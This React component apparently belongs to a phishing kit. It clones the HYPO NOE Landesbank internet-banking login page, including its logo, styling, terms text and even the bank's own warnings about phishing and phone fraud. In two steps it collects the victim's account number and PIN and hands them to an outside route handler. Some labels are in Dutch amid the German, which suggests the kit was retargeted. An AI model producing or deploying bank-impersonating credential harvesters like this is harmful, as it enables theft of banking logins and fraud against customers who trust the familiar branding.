"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen font-sans flex flex-col relative overflow-x-hidden">
      {/* Background Pattern */}
      <div 
        className="absolute inset-0 -z-10"
        style={{
          backgroundImage: "url('/hyponoe-bg.webp')",
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundColor: "#f5f5f5"
        }}
      ></div>

      {/* Header */}
      <header className="w-full bg-white h-[80px] flex items-center px-4 md:px-12 shrink-0 shadow-sm">
        <div className="flex items-center">
          <div className="relative w-40 h-16">
            <Image 
              src="/hyponoe-logo.webp" 
              alt="HYPO NOE Logo" 
              fill
              className="object-contain object-left"
            />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-[620px] bg-white shadow-[0_4px_20px_rgba(0,0,0,0.1)] flex flex-col">
          
          {/* Blue Title Bar */}
          <div className="bg-[#0066cc] text-white px-6 py-4">
            <h1 className="text-[22px] font-normal tracking-wide">Login 24/7 Internetbanking</h1>
          </div>

          <div className="p-6 md:p-8">
            
            {/* Orange Warning Box */}
            <div className="border border-[#ff8c00] bg-white p-4 flex gap-4 mb-6 relative overflow-hidden">
              <div className="shrink-0 pt-1">
                <div className="w-7 h-7 bg-[#ff8c00] rounded-full flex items-center justify-center text-white font-bold text-lg">
                  !
                </div>
              </div>
              <div className="flex flex-col gap-2">
                <p className="text-[#ff8c00] font-bold text-[14px] leading-snug">
                  ACHTUNG: Warnung vor Phishing-SMS rund um ID Austria!
                </p>
                <p className="text-[#ff8c00] font-bold text-[14px] leading-snug">
                  ACHTUNG: Warnung vor Betrüger, die sich am Telefon als Bankmitarbeiterin oder Bankmitarbeiter der HYPO NOE ausgeben!
                </p>
                <a href="#" className="text-[#ff8c00] text-[14px] hover:underline mt-1 inline-block">
                  Informieren Sie sich hier ...
                </a>
              </div>
            </div>

            {/* Info Text */}
            <p className="text-[#333] text-[13px] leading-relaxed mb-4">
              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Houd uw inloggegevens geheim en voer deze nergens anders in. Onze medewerkers zullen u nooit om uw inloggegevens vragen.
            </p>

            <p className="text-[#333] text-[13px] mb-6">
              Bekijk onze <a href="#" className="text-[#0066cc] hover:underline">veiligheidsaanbevelingen</a>.
            </p>

            {/* Form Area */}
            <form onSubmit={step === 1 ? handleNextStep : handleFinalSubmit} className="flex flex-col">
              
              <div className="flex justify-between items-end mb-1">
                <label className="text-[#666] text-[12px]">
                  {step === 1 ? "Gebruikersnaam" : "Wachtwoord / PIN"}
                </label>
                <a href="#" className="text-[#0066cc] text-[12px] hover:underline">
                  Barrierefrei
                </a>
              </div>

              <div className="mb-6">
                {step === 1 ? (
                  <input 
                    type="text" 
                    required
                    autoFocus
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[38px] bg-[#f2f2f2] border border-[#e0e0e0] rounded px-3 outline-none focus:border-[#0066cc] focus:bg-white text-[#333] text-[14px] transition-colors"
                  />
                ) : (
                  <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                    <input 
                      type="password" 
                      required
                      autoFocus
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[38px] bg-[#f2f2f2] border border-[#e0e0e0] rounded px-3 outline-none focus:border-[#0066cc] focus:bg-white text-[#333] text-[14px] transition-colors"
                    />
                  </div>
                )}
              </div>

              <div className="text-center mb-6">
                <a href="#" className="text-[#0066cc] text-[14px] hover:underline">
                  Sie melden sich zum ersten Mal an?
                </a>
              </div>

              {/* Consent Text */}
              <p className="text-[#666] text-[11px] text-center leading-snug mb-6">
                Mit dem Login stimmen Sie den <a href="#" className="text-[#0066cc] hover:underline">AGB</a> und <a href="#" className="text-[#0066cc] hover:underline">Nutzungsbedingungen</a> sowie der <a href="#" className="text-[#0066cc] hover:underline">Datenschutzerklärung</a> der HYPO NOE Landesbank für Niederösterreich und Wien AG ausdrücklich zu.
              </p>

              {/* Action Buttons */}
              <button 
                type="submit" 
                disabled={saving}
                className="w-full bg-[#0066cc] hover:bg-[#0052a3] text-white font-medium h-[42px] rounded-[4px] text-[15px] transition-colors disabled:opacity-70"
              >
                {saving ? "Wird geladen..." : "Weiter"}
              </button>

              {step === 2 && (
                <button 
                  type="button" 
                  onClick={() => setStep(1)}
                  className="w-full mt-3 bg-white border border-[#0066cc] hover:bg-blue-50 text-[#0066cc] font-medium h-[42px] rounded-[4px] text-[15px] transition-colors"
                >
                  Zurück
                </button>
              )}
            </form>

            {/* Footer Links inside card */}
            <div className="flex flex-col items-center gap-3 mt-8">
              <a href="#" className="text-[#0066cc] text-[13px] hover:underline">
                Gebruikersnaamn vergessen?
              </a>
              <div className="flex items-center gap-1.5 cursor-pointer group">
                <div className="w-[18px] h-[18px] rounded-full border border-[#0066cc] text-[#0066cc] flex items-center justify-center font-serif text-[11px] group-hover:bg-[#0066cc] group-hover:text-white transition-colors">
                  i
                </div>
                <a href="#" className="text-[#0066cc] text-[13px] group-hover:underline">
                  Live Hilfe
                </a>
              </div>
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
